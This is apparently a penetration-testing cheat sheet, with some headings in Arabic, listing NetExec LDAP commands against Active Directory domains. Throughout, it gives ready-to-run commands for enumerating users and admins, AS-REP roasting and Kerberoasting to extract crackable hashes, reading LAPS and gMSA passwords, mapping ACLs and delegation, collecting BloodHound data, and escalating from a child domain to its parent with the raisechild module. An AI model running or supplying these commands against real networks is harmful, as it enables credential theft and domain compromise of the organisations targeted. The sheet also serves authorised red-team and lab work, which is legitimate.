
## المستخدمين

bash

```bash
nxc ldap <ip> -u user -p pass --users
nxc ldap <ip> -u user -p pass --users-export users.txt
nxc ldap <ip> -u user -p pass --active-users
nxc ldap <ip> -u user -p pass --admin-count
nxc ldap <ip> -u user -p pass --password-not-required
nxc ldap <ip> -u user -p pass -M get-desc-users
```

## المجموعات والأجهزة

bash

```bash
nxc ldap <ip> -u user -p pass --groups
nxc ldap <ip> -u user -p pass --groups "Domain Admins"
nxc ldap <ip> -u user -p pass --computers
nxc ldap <ip> -u user -p pass -M groupmembership -o USER='targetuser'
nxc ldap <ip> -u user -p pass -M group-mem -o GROUP='Domain Admins'
```

## Domain Info

bash

```bash
nxc ldap <ip> -u user -p pass --get-sid
nxc ldap <ip> -u user -p pass --dc-list
nxc ldap <ip> -u user -p pass --pso
nxc ldap <ip> -u user -p pass -M enum_trusts
nxc ldap <ip> -u user -p pass -M maq
nxc ldap <ip> -u user -p pass -M get-network
nxc ldap <ip> -u user -p pass -M get-network -o ONLY_HOSTS=true
nxc ldap <ip> -u user -p pass -M get-network -o ALL=true
nxc ldap <ip> -u user -p pass -M whoami
```

## Kerberos Attacks

bash

```bash
nxc ldap <ip> -u user -p pass --asreproast output.txt
nxc ldap <ip> -u users.txt -p '' --asreproast output.txt
nxc ldap <ip> -u user -p pass --asreproast output.txt --kdcHost <DC-IP>
nxc ldap <ip> -u user -p pass --kerberoasting output.txt
nxc ldap <ip> -u user -p pass --kerberoasting output.txt --kdcHost <DC-IP>
nxc ldap <ip> -u asrep_user -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```

## Delegation

bash

```bash
nxc ldap <ip> -u user -p pass --trusted-for-delegation
nxc ldap <ip> -u user -p pass --find-delegation
```

## DACL / ACL

bash

```bash
nxc ldap <DC-IP> -u user -p pass -M daclread -o TARGET=Administrator ACTION=read
nxc ldap <DC-IP> -u user -p pass -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=compromised_user
nxc ldap <DC-IP> -u user -p pass -M daclread -o TARGET_DN="DC=domain,DC=LOCAL" ACTION=read RIGHTS=DCSync
nxc ldap <DC-IP> -u user -p pass -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied
nxc ldap <DC-IP> -u user -p pass -M daclread -o TARGET=targets.txt ACTION=backup
```

## استعلامات يدوية

bash

```bash
nxc ldap <ip> -u user -p pass --query "(sAMAccountName=Administrator)" ""
nxc ldap <ip> -u user -p pass --query "(sAMAccountName=*)" "sAMAccountName mail description"
nxc ldap <ip> -u user -p pass --query "(objectClass=computer)" "name operatingSystem"
nxc ldap <ip> -u user -p pass --query "(adminCount=1)" "sAMAccountName"
nxc ldap <ip> -u user -p pass --query "(servicePrincipalName=*)" "sAMAccountName servicePrincipalName"
nxc ldap <ip> -u user -p pass --query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" "sAMAccountName"
nxc ldap <ip> -u user -p pass --query "(name=jon.snow)" "msDS-AllowedToDelegateTo cn" --base-dn "DC=domain,DC=local"
```

## BloodHound

bash

```bash
nxc ldap <ip> -u user -p pass --bloodhound --collection All --dns-server <DC-IP>
nxc ldap <ip> -u user -p pass --bloodhound --collection DCOnly
nxc ldap <ip> -u user -p pass --bloodhound --collection Group,ACL,Trusts
```

## LAPS

bash

```bash
nxc ldap <ip> -u user -p pass -M laps
```

## gMSA

bash

```bash
nxc ldap <ip> -u user -p pass --gmsa
nxc ldap <ip> -u user -p pass --gmsa-convert-id <id>
nxc ldap <ip> -u user -p pass --gmsa-decrypt-lsa '<lsa_value>'
```

## Pre2K

bash

```bash
nxc ldap <ip> -u user -p pass -M pre2k
```

## ADCS

bash

```bash
nxc ldap <ip> -u user -p pass -M adcs
nxc ldap <ip> -u user -p pass -M adcs -o SERVER=CA01
```

## Domain Trusts / Raisechild

bash

```bash
nxc ldap <DC-IP> -u user -p pass -M raisechild
nxc ldap <DC-IP> -u user -p pass -M raisechild -o USER=test123 USER_ID=1111
nxc ldap <DC-IP> -u user -p pass -M raisechild -o ETYPE=aes256
nxc ldap <DC-IP> -u user -p pass -M raisechild -o RID=519
```

## Entra ID / Azure AD Sync

bash

```bash
nxc ldap <ip> -u user -p pass -M entra-id
```

## SCCM

bash

```bash
nxc ldap <ip> -u user -p pass -M sccm -o REC_RESOLVE=TRUE
```




